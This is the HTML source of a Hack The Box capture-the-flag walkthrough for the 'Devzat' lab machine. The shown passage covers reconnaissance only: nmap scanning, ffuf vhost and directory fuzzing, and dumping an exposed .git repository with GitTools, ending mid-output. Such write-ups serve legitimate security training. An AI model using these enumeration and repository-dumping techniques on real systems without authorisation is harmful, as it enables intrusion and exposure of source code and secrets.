@@ -1,0 +1,581 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="introduceOS:	 LinuxDifficulty:	MediumPoints:	30Release:	16 Oct 2021IP:	10.10.11.118">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hack-The-Box-walkthrough[devzat]">
+<meta property="og:url" content="https://fdlucifer.github.io/2021/10/19/devzat/index.html">
+<meta property="og:site_name" content="lUc1f3r11&#39;s blog">
+<meta property="og:description" content="introduceOS:	 LinuxDifficulty:	MediumPoints:	30Release:	16 Oct 2021IP:	10.10.11.118">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2089.jpg">
+<meta property="og:image" content="http://www.hackthebox.eu/badge/image/235857">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2090.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2091.jpg">
+<meta property="article:published_time" content="2021-10-19T12:50:15.000Z">
+<meta property="article:modified_time" content="2022-03-12T15:54:06.116Z">
+<meta property="article:author" content="lUc1f3r11">
+<meta property="article:tag" content="HackTheBox靶机练习">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2089.jpg">
+
+
+<link rel="canonical" href="https://fdlucifer.github.io/2021/10/19/devzat/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2021/10/19/devzat/","path":"2021/10/19/devzat/","title":"Hack-The-Box-walkthrough[devzat]"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Hack-The-Box-walkthrough[devzat] | lUc1f3r11's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">lUc1f3r11's blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">by lUc1f3r11</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">42</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">32</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">203</span></a></li><li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>Schedule</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>Sitemap</a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#introduce"><span class="nav-number">1.</span> <span class="nav-text">introduce</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Enumeration"><span class="nav-number">2.</span> <span class="nav-text">Enumeration</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Nmap"><span class="nav-number">2.1.</span> <span class="nav-text">Nmap</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#vuln-confirm"><span class="nav-number">3.</span> <span class="nav-text">vuln confirm</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#get-user"><span class="nav-number">4.</span> <span class="nav-text">get user</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#get-root"><span class="nav-number">5.</span> <span class="nav-text">get root</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Summary-of-knowledge"><span class="nav-number">6.</span> <span class="nav-text">Summary of knowledge</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Contact-me"><span class="nav-number">7.</span> <span class="nav-text">Contact me</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="lUc1f3r11"
+      src="/images/lucifer11.jpg">
+  <p class="site-author-name" itemprop="name">lUc1f3r11</p>
+  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">203</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">32</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">42</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ19saVRlaDRSMUZNYnBWeGxwTWUtdnc=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UC_liTeh4R1FMbpVxlpMe-vw"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange → https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="custom mastodon fa-fw"></i>infosec.exchange</span>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="Back to top">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          Links
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">记忆里的纯真</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">小离</span>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2021/10/19/devzat/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/lucifer11.jpg">
+      <meta itemprop="name" content="lUc1f3r11">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lUc1f3r11's blog">
+      <meta itemprop="description" content="All things about infosec & ctf">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Hack-The-Box-walkthrough[devzat] | lUc1f3r11's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Hack-The-Box-walkthrough[devzat]
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2021-10-19 20:50:15" itemprop="dateCreated datePublished" datetime="2021-10-19T20:50:15+08:00">2021-10-19</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2022-03-12 23:54:06" itemprop="dateModified" datetime="2022-03-12T23:54:06+08:00">2022-03-12</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/HackTheBox-walkthrough/" itemprop="url" rel="index"><span itemprop="name">HackTheBox walkthrough</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="introduce"><a href="#introduce" class="headerlink" title="introduce"></a>introduce</h1><p>OS:	 Linux<br>Difficulty:	Medium<br>Points:	30<br>Release:	16 Oct 2021<br>IP:	10.10.11.118</p>
+<ul>
+<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2089.jpg"></p>
+</li>
+<li><p><img src="http://www.hackthebox.eu/badge/image/235857" alt="my htb rank"></p>
+</li>
+</ul>
+<span id="more"></span>
+
+<h1 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h1><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/devzat]</span><br><span class="line">└─<span class="comment"># nmap -sV -v -p- --min-rate=10000 10.10.11.118</span></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.41</span><br><span class="line">8000/tcp open  ssh     (protocol 2.0)</span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port8000-TCP:V=7.91%I=7%D=10/19%Time=616EC117%P=x86_64-pc-linux-gnu%r(N</span><br><span class="line">SF:ULL,C,<span class="string">&quot;SSH-2\.0-Go\r\n&quot;</span>);</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
+
+<p>Nmap reveals three open ports, two of them are SSH and one HTTP and it also reveals the hostname, add that to hosts file and access HTTP.</p>
+<p>Devzat is actually an application designed to chat with developers over SSH.</p>
+<ul>
+<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3F1YWNrZHVjay9kZXZ6YXQ=">devzat<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<p>Let’s access the chat.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/devzat]</span><br><span class="line">└─<span class="comment"># ssh -l test devzat.htb -p 8000</span></span><br><span class="line">The authenticity of host <span class="string">&#x27;[devzat.htb]:8000 ([10.10.11.118]:8000)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">RSA key fingerprint is SHA256:f8dMo2xczXRRA43d9weJ7ReJdZqiCxw5vP7XqBaZutI.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>[devzat.htb]:8000,[10.10.11.118]:8000<span class="string">&#x27; (RSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">                                                                                                        2 hours 27 minutes earlier</span></span><br><span class="line"><span class="string">id</span></span><br><span class="line"><span class="string">devbot:  has left the chat</span></span><br><span class="line"><span class="string">                                                                                                        2 hours 15 minutes earlier</span></span><br><span class="line"><span class="string">devbot: pets has joined the chat</span></span><br><span class="line"><span class="string">                                                                                                        2 hours 14 minutes earlier</span></span><br><span class="line"><span class="string">devbot: hoge has joined the chat</span></span><br><span class="line"><span class="string">                                                                                                        2 hours 12 minutes earlier</span></span><br><span class="line"><span class="string">pets: example-code</span></span><br><span class="line"><span class="string">                                                                                                         2 hours 7 minutes earlier</span></span><br><span class="line"><span class="string">devbot: pets has left the chat</span></span><br><span class="line"><span class="string">devbot: pets stayed on for 8 minutes</span></span><br><span class="line"><span class="string">                                                                                                          1 hour 8 minutes earlier</span></span><br><span class="line"><span class="string">devbot: hoge has left the chat</span></span><br><span class="line"><span class="string">devbot: hoge stayed on for 1 hour 6 minutes</span></span><br><span class="line"><span class="string">                                                                                                                38 minutes earlier</span></span><br><span class="line"><span class="string">devbot: You seem to be new here catharine. Welcome to Devzat! Run /help to see what you can do.</span></span><br><span class="line"><span class="string">devbot: catharine has joined the chat</span></span><br><span class="line"><span class="string">devbot: catharine has left the chat</span></span><br><span class="line"><span class="string">devbot: patrick has joined the chat</span></span><br><span class="line"><span class="string">devbot: patrick has left the chat</span></span><br><span class="line"><span class="string">devbot: admin has joined the chat</span></span><br><span class="line"><span class="string">                                                                                                                37 minutes earlier</span></span><br><span class="line"><span class="string">devbot: admin has left the chat</span></span><br><span class="line"><span class="string">Welcome to the chat. There are no more users</span></span><br><span class="line"><span class="string">devbot: test has joined the chat</span></span><br><span class="line"><span class="string">test: /commands</span></span><br><span class="line"><span class="string">[SYSTEM] Commands</span></span><br><span class="line"><span class="string">[SYSTEM] clear - Clears your terminal</span></span><br><span class="line"><span class="string">[SYSTEM] message - Sends a private message to someone</span></span><br><span class="line"><span class="string">[SYSTEM] users - Gets a list of the active users</span></span><br><span class="line"><span class="string">[SYSTEM] all - Gets a list of all users who has ever connected</span></span><br><span class="line"><span class="string">[SYSTEM] exit - Kicks you out of the chat incase your client was bugged</span></span><br><span class="line"><span class="string">[SYSTEM] bell - Toggles notifications when you get pinged</span></span><br><span class="line"><span class="string">[SYSTEM] room - Changes which room you are currently in</span></span><br><span class="line"><span class="string">[SYSTEM] id - Gets the hashed IP of the user</span></span><br><span class="line"><span class="string">[SYSTEM] commands - Get a list of commands</span></span><br><span class="line"><span class="string">[SYSTEM] nick - Change your display name</span></span><br><span class="line"><span class="string">[SYSTEM] color - Change your display name color</span></span><br><span class="line"><span class="string">[SYSTEM] timezone - Change how you view time</span></span><br><span class="line"><span class="string">[SYSTEM] emojis - Get a list of emojis you can use</span></span><br><span class="line"><span class="string">[SYSTEM] help - Get generic info about the server</span></span><br><span class="line"><span class="string">[SYSTEM] tictactoe - Play tictactoe</span></span><br><span class="line"><span class="string">[SYSTEM] hangman - Play hangman</span></span><br><span class="line"><span class="string">[SYSTEM] shrug - Drops a shrug emoji</span></span><br><span class="line"><span class="string">[SYSTEM] ascii-art - Bob ross with text</span></span><br><span class="line"><span class="string">[SYSTEM] example-code - Hello world!</span></span><br></pre></td></tr></table></figure>
+
+<p>There’s nothing much which can help us to gain shell access. Let’s look for any vhosts.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ffuf -c -u http://devzat.htb -H <span class="string">&quot;Host: FUZZ.devzat.htb&quot;</span> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200</span><br><span class="line"></span><br><span class="line">pets [Status: 200, Size: 510, Words: 20, Lines: 21]</span><br></pre></td></tr></table></figure>
+
+<p>We got one vhost, let’s add that to hosts file and access it.</p>
+<p>It’s a pet inventory, where we can add pet names. Let’s look for any Directory’s.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ffuf -u http://pets.devzat.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -fs 510</span><br><span class="line"></span><br><span class="line">css [Status: 301, Size: 40, Words: 3, Lines: 3]</span><br><span class="line">build [Status: 301, Size: 42, Words: 3, Lines: 3]</span><br><span class="line">server-status [Status: 403, Size: 280, Words: 20, Lines: 10]</span><br><span class="line">.git [Status: 301, Size: 41, Words: 3, Lines: 3]</span><br></pre></td></tr></table></figure>
+
+<p>We got ‘.git’ directory, let’s dump and extract the commits.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/devzat]</span><br><span class="line">└─<span class="comment"># /root/GitTools-master/Dumper/gitdumper.sh http://pets.devzat.htb/.git/ pets</span></span><br><span class="line"><span class="comment">###########</span></span><br><span class="line"><span class="comment"># GitDumper is part of https://github.com/internetwache/GitTools</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Developed and maintained by @gehaxelt from @internetwache</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Use at your own risk. Usage might be illegal in certain circumstances. </span></span><br><span class="line"><span class="comment"># Only for educational purposes!</span></span><br><span class="line"><span class="comment">###########</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] Destination folder does not exist</span><br><span class="line">[+] Creating pets/.git/</span><br><span class="line">[+] Downloaded: HEAD</span><br><span class="line">[-] Downloaded: objects/info/packs</span><br><span class="line">[+] Downloaded: description</span><br><span class="line">[+] Downloaded: config</span><br><span class="line">[+] Downloaded: COMMIT_EDITMSG</span><br><span class="line">[+] Downloaded: index</span><br><span class="line">[-] Downloaded: packed-refs</span><br><span class="line">[+] Downloaded: refs/heads/master</span><br><span class="line">[-] Downloaded: refs/remotes/origin/HEAD</span><br><span class="line">[-] Downloaded: refs/stash</span><br><span class="line">[+] Downloaded: logs/HEAD</span><br><span class="line">[+] Downloaded: logs/refs/heads/master</span><br><span class="line">[-] Downloaded: logs/refs/remotes/origin/HEAD</span><br><span class="line">[-] Downloaded: info/refs</span><br><span class="line">[+] Downloaded: info/exclude</span><br><span class="line">[-] Downloaded: /refs/wip/index/refs/heads/master</span><br><span class="line">[-] Downloaded: /refs/wip/wtree/refs/heads/master</span><br><span class="line">[+] Downloaded: objects/ef/07a04ebb2fc92cf74a39e0e4b843630666a705</span><br><span class="line">[-] Downloaded: objects/00/00000000000000000000000000000000000000</span><br><span class="line">[+] Downloaded: objects/82/74d7a547c0c3854c074579dfc359664082a8f6</span><br><span class="line">[+] Downloaded: objects/46/4614f32483e1fde60ee53f5d3b4d468d80ff62</span><br><span class="line">[+] Downloaded: objects/55/1abaa3c707703936e5e31b8e4645b35e5f6c07</span><br><span class="line">[+] Downloaded: objects/3a/e86c86b0053b79cdbfc1456d6059986a9d3813</span><br><span class="line">[+] Downloaded: objects/8d/a69971e32e6e08cae489b40731845d1de13258</span><br><span class="line">[+] Downloaded: objects/93/28c7f72254a754c91fddfd3c7e62c1251a2828</span><br><span class="line">[+] Downloaded: objects/2f/37bf8e3a0ce61b74fec752fad017c363511d31</span><br><span class="line">[+] Downloaded: objects/69/f1153887d2790c94f23a00c6f85958cf198418</span><br><span class="line">[+] Downloaded: objects/53/5028803d222b0e4e9174f56529c0ed9fece4e0</span><br><span class="line">[+] Downloaded: objects/54/f95a54c49178dd5d496058e4ee99829748c49a</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/devzat/pets]</span><br><span class="line">└─<span class="comment"># /root/GitTools-master/Extractor/extractor.sh . pets</span></span><br><span class="line"><span class="comment">###########</span></span><br><span class="line"><span class="comment"># Extractor is part of https://github.com/internetwache/GitTools</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Developed and maintained by @gehaxelt from @internetwache</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Use at your own risk. Usage might be illegal in certain circumstances. </span></span><br><span class="line"><span class="comment"># Only for educational purposes!</span></span><br><span class="line"><span class="comment">###########</span></span><br><span class="line">[*] Destination folder does not exist</span><br><span class="line">[*] Creating...</span><br><span class="line">[+] Found commit: 8274d7a547c0c3854c074579dfc359664082a8f6</span><br><span class="line">[+] Found file: /root/hackthebox/machine/devzat/pets/pets/0-8274d7a547c0c3854c074579dfc359664082a8f6/.gitignore</span><br><span class="line">[+] Found folder: /root/hackthebox/machine/devzat/pets/pets/0-8274d7a547c0c3854c074579dfc359664082a8f6/characteristics</span><br><span class="line">[+] Found file: /root/hackthebox/machine/devzat/pets/pets/0-8274d7a547c0c3854c074579dfc359664082a8f6/characteristics/bluewhale</span><br><span class="line">[+] Found file: /root/hackthebox/machine/devzat/pets/pets/0-8274d7a547c0c3854c074579dfc359664082a8f6/characteristics/cat</span><br><span class="line">[+] Found file: 